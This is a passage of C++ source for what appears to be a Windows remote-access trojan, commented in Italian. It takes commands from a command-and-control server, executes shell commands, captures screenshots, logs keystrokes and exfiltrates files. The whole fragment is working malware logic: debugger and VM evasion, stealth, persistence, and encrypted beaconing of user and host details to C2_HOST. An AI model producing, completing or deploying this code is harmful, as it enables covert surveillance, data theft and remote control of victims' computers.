    PROCESS_INFORMATION pi = {0};
    std::string cmdLine = std::string(OBF("cmd.exe /c ")) + cmd;
    
    if (CreateProcessA(NULL, (LPSTR)cmdLine.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);
        hWrite = NULL;
        
        std::string output;
        char buffer[4096];
        DWORD read;
        
        while (ReadFile(hRead, buffer, sizeof(buffer), &read, NULL) && read > 0) {
            output.append(buffer, read);
        }
        
        WaitForSingleObject(pi.hProcess, INFINITE);
        
        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hRead);
        
        return output;
    }
    
    if (hWrite) CloseHandle(hWrite);
    if (hRead) CloseHandle(hRead);
    return "";
}

// --- HANDLE COMMANDS ---
std::string handle_command(const std::string& cmd) {
    if (cmd.length() >= 4 && cmd.substr(0, 4) == "exec") {
        if (cmd.length() > 5) {
            std::string command = cmd.substr(5);
            return execute_command(command);
        }
        return "No command specified";
    }
    else if (cmd == "screenshot") {
        auto screenshot = take_screenshot();
        return std::string(screenshot.begin(), screenshot.end());
    }
    else if (cmd == "keylog") {
        return LOG_BUF;
    }
    else if (cmd.length() >= 8 && cmd.substr(0, 8) == "download") {
        if (cmd.length() > 9) {
            std::string filepath = cmd.substr(9);
            std::ifstream file(filepath, std::ios::binary);
            if (file) {
                std::string content((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
                return content;
            }
            return "File not found";
        }
        return "No file specified";
    }
    return "Unknown command";
}

// --- MAIN: STAGER + BEACON ---
int main() {
    // Debug logging iniziale
    debug_log("C2 Client starting...");
    
    // Controllo versione Windows
    if (!is_windows_version_supported()) {
        debug_log("Unsupported Windows version");
        return 1;
    }
    
    // Anti-analysis
    if (is_debugger()) {
        debug_log("Debugger detected");
        return 1;
    }
    
    if (is_vm()) {
        debug_log("Virtual machine detected");
        return 1;
    }
    
    // Stealth mode
    stealth();
    
    // Persistence
    persist();

    // Initialize crypto
    HCRYPTPROV hProv;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        debug_log("Failed to initialize cryptographic context");
        return 1;
    }
    
    debug_log("Cryptographic context initialized successfully");

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> jitter(1000, BEACON_JITTER_MS);

    // Generate AES session key
    uint8_t session_key[32];
    uint8_t iv[12];
    if (!CryptGenRandom(hProv, 32, session_key) || !CryptGenRandom(hProv, 12, iv)) {
        CryptReleaseContext(hProv, 0);
        return 1;
    }
    
    // Key exchange flag - prima connessione speciale
    bool key_exchange_completed = false;

    while (true) {
        // Costruisci beacon cifrato
        char user[256] = {};
        char host[256] = {};
        DWORD user_size = sizeof(user);
        DWORD host_size = sizeof(host);
        
        if (!GetUserNameA(user, &user_size)) {
            strcpy_s(user, "Unknown");
        }
        if (!GetComputerNameA(host, &host_size)) {
            strcpy_s(host, "Unknown");
        }

        std::string beacon = "BEACON|";
        beacon += user; beacon += "|"; beacon += host; beacon += "|";
        beacon += std::to_string(GetCurrentProcessId());

        // Cifratura AES
        uint8_t tag[16];
        auto encrypted = aes_encrypt_gcm((const uint8_t*)beacon.c_str(), beacon.size(), session_key, iv, tag);
        if (encrypted.empty()) {
            Sleep(1000 + jitter(gen));
            continue;
        }

        // Prepara payload
        std::vector<uint8_t> payload;
        payload.insert(payload.end(), iv, iv + 12);
        payload.insert(payload.end(), tag, tag + 16);
        payload.insert(payload.end(), encrypted.begin(), encrypted.end());

        // Invia via HTTPS
        debug_log("Sending encrypted beacon to C2 server");
        
        std::string response;
        
        if (!key_exchange_completed) {
            // === KEY EXCHANGE RSA-OAEP ===
            debug_log("Performing RSA-OAEP key exchange...");
            
            // Prepara la chiave AES per la cifratura RSA
            std::string aes_key_str(reinterpret_cast<const char*>(session_key), 32);
            
            // Cifra la chiave AES con RSA-OAEP usando la chiave pubblica del server
            std::vector<BYTE> public_key_blob(SERVER_PUBLIC_KEY, SERVER_PUBLIC_KEY + SERVER_PUBLIC_KEY_SIZE);
            std::vector<BYTE> encrypted_aes_key;
            
            if (rsa_encrypt_oaep(public_key_blob, aes_key_str, encrypted_aes_key)) {
                debug_log("AES key encrypted with RSA-OAEP successfully");
                
                // Invia la chiave cifrata al endpoint dedicato /key_exchange
                response = https_post(C2_HOST, "/key_exchange", encrypted_aes_key);
                
                if (!response.empty() && response.size() > 28) {
                    // Estrai IV, tag e dati cifrati dalla risposta
                    const uint8_t* resp_iv = (const uint8_t*)response.data();
                    const uint8_t* resp_tag = resp_iv + 12;
                    const uint8_t* resp_encrypted = resp_tag + 16;
                    size_t resp_encrypted_len = response.size() - 28;
                    
                    // Decifra la risposta di conferma con la nostra chiave AES
                    auto confirm_data = aes_decrypt_gcm(session_key, resp_iv, resp_encrypted, resp_encrypted_len, resp_tag);
                    if (!confirm_data.empty()) {
                        std::string confirm_msg(confirm_data.begin(), confirm_data.end());
                        if (confirm_msg == "KEY_EXCHANGE_OK") {
                            debug_log("RSA-OAEP key exchange completed successfully");
                            key_exchange_completed = true;
                            continue; // Salta l'elaborazione del comando per questo ciclo
                        } else {
                            debug_log("Key exchange failed: invalid confirmation message");
                        }
                    } else {
                        debug_log("Key exchange failed: cannot decrypt confirmation");
                    }
                } else {
                    debug_log("Key exchange failed: empty or invalid response from server");
                }
            } else {
                debug_log("Key exchange failed: RSA encryption failed");
            }
            
            // Se il key exchange fallisce, aspetta prima di riprovare
            Sleep(5000 + jitter(gen));
            continue;
        } else {
            // Comunicazione normale con chiave di sessione stabilita
            response = https_post(C2_HOST, C2_PATH, payload);
        }

        if (!response.empty()) {
            
            if (response.size() > 28) {
                debug_log("Received response from C2 server, size: %zu bytes", response.size());
                // Estrai IV, tag e dati cifrati
                const uint8_t* resp_iv = (const uint8_t*)response.data();
                const uint8_t* resp_tag = resp_iv + 12;
                const uint8_t* resp_encrypted = resp_tag + 16;
                size_t resp_encrypted_len = response.size() - 28;

                // Decifra risposta
                auto cmd_data = aes_decrypt_gcm(session_key, resp_iv, resp_encrypted, resp_encrypted_len, resp_tag);
                if (!cmd_data.empty()) {
                    std::string command(cmd_data.begin(), cmd_data.end());
                    std::string result = handle_command(command);
                    
                    // Se c'è un risultato, invialo al C2
                    if (!result.empty()) {
                        uint8_t response_tag[16];
                        auto response_encrypted = aes_encrypt_gcm((const uint8_t*)result.c_str(), result.size(), session_key, iv, response_tag);
                        if (!response_encrypted.empty()) {
                            std::vector<uint8_t> response_payload;
                            response_payload.insert(response_payload.end(), iv, iv + 12);
                            response_payload.insert(response_payload.end(), response_tag, response_tag + 16);
                            response_payload.insert(response_payload.end(), response_encrypted.begin(), response_encrypted.end());
                            https_post(C2_HOST, C2_PATH, response_payload);
                        }
                    }
                }
            }
        }

        // Keylogging
        log_keys();
        
        // Sleep con jitter
        Sleep(1000 + jitter(gen));
    }
}